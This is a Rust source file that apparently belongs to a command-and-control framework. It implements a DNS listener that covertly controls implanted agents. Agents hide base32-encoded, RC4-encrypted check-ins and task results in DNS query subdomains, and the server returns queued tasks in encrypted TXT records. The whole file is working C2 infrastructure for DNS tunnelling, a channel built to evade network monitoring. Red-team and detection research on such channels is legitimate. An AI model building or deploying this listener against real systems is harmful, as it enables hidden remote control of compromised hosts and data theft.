use hickory_proto::rr::{Record, RData, Name};
use hickory_proto::op::{Header, Message, ResponseCode};
use std::net::SocketAddr;
use tokio::sync::{mpsc, oneshot};
use tokio_util::sync::CancellationToken;
use tokio::net::UdpSocket;
use tracing::info;
use data_encoding::BASE32_NOPAD;
use anyhow::Result;
use async_trait::async_trait;

use crate::core::CoreEvent;
use crate::listeners::{rc4, hex_to_bytes, CheckinRequest, ResultRequest, CheckinResponse, Listener};

pub struct DnsListener {
    id: String,
    addr: SocketAddr,
    domain: Name,
    tx: mpsc::Sender<CoreEvent>,
    session_key: [u8; 16],
}

impl DnsListener {
    pub fn new(id: String, addr: SocketAddr, domain: String, tx: mpsc::Sender<CoreEvent>, session_key_hex: String) -> Result<Self> {
        let name = Name::from_utf8(&format!("{}.", domain))?;
        Ok(Self {
            id,
            addr,
            domain: name,
            tx,
            session_key: hex_to_bytes(&session_key_hex),
        })
    }
}

#[async_trait]
impl Listener for DnsListener {
    fn id(&self) -> String { self.id.clone() }

    async fn run(&self, _handle: axum_server::Handle, token: CancellationToken) -> Result<()> {
        info!("DNS Listener {} starting manual UDP loop on {} for domain {}", self.id, self.addr, self.domain);
        
        let socket = UdpSocket::bind(self.addr).await?;
        let mut buf = [0u8; 4096];

        loop {
            tokio::select! {
                _ = token.cancelled() => {
                    info!("DNS Listener {} received closure signal", self.id);
                    break;
                }
                result = socket.recv_from(&mut buf) => {
                    if let Ok((len, src)) = result {
                        let request_data = &buf[..len];
                        // We extract the name synchronously to avoid ICE in async handler
                        if let Some((name, query_id)) = self.parse_request_params(request_data) {
                            let response_data = self.process_c2_logic(&name, src).await;
                            if let Ok(response_bytes) = self.build_response_packet(&name, query_id, response_data) {
                                let _ = socket.send_to(&response_bytes, src).await;
                            }
                        }
                    }
                }
            }
        }
        Ok(())
    }
}

impl DnsListener {
    // Synchronous helper to avoid ICE in generator
    fn parse_request_params(&self, data: &[u8]) -> Option<(Name, u16)> {
        let msg = Message::from_vec(data).ok()?;
        let query = msg.queries().first()?;
        Some((query.name().clone(), msg.id()))
    }

    // Synchronous helper to avoid ICE in generator
    fn build_response_packet(&self, name: &Name, query_id: u16, response_data: String) -> Result<Vec<u8>> {
        let mut response = Message::new();
        response.set_id(query_id);
        
        let mut header = Header::new();
        header.set_id(query_id);
        header.set_message_type(hickory_proto::op::MessageType::Response);
        header.set_op_code(hickory_proto::op::OpCode::Query);
        header.set_authoritative(true);
        header.set_response_code(ResponseCode::NoError);
        response.set_header(header);
        
        let record = Record::from_rdata(
            name.clone(),
            60,
            RData::TXT(hickory_proto::rr::rdata::TXT::new(vec![response_data])),
        );
        response.add_answer(record);

        Ok(response.to_vec()?)
    }

    async fn process_c2_logic(&self, name: &Name, src: SocketAddr) -> String {
        let mut labels: Vec<String> = name.iter().map(|l| String::from_utf8_lossy(l).to_string()).collect();
        let domain_len = self.domain.iter().count();
        if labels.len() <= domain_len { return "ok".to_string(); }
        
        for _ in 0..domain_len { labels.pop(); }
        if labels.len() < 2 { return "ok".to_string(); }

        let b32_data = &labels[0];
        let mut decoded = match BASE32_NOPAD.decode(b32_data.as_bytes()) {
            Ok(d) => d,
            Err(_) => return "ok".to_string(),
        };

        rc4(&mut decoded, &self.session_key);

        let mut tasks_to_return = Vec::new();
        if let Ok(checkin) = serde_json::from_slice::<CheckinRequest>(&decoded) {
            let (res_tx, res_rx) = oneshot::channel();
            let event = CoreEvent::AgentCheckin {
                agent_id: checkin.agent_id,
                hostname: checkin.hostname,
                username: checkin.username,
                ip_address: checkin.ip_address,
                external_ip: src.ip().to_string(),
                sleep: checkin.sleep,
                responder: res_tx,
            };
            let _ = self.tx.send(event).await;
            if let Ok(Ok(tasks)) = res_rx.await { tasks_to_return = tasks; }
        } else if let Ok(result) = serde_json::from_slice::<ResultRequest>(&decoded) {
            let event = CoreEvent::TaskResult {
                task_id: result.task_id,
                output: result.output.into_bytes(),
            };
            let _ = self.tx.send(event).await;
        }

        if !tasks_to_return.is_empty() {
            let resp = CheckinResponse { status: "ok".to_string(), tasks: tasks_to_return };
            let mut bytes = serde_json::to_vec(&resp).unwrap_or_default();
            rc4(&mut bytes, &self.session_key);
            BASE32_NOPAD.encode(&bytes)
        } else {
            "ok".to_string()
        }
    }
}
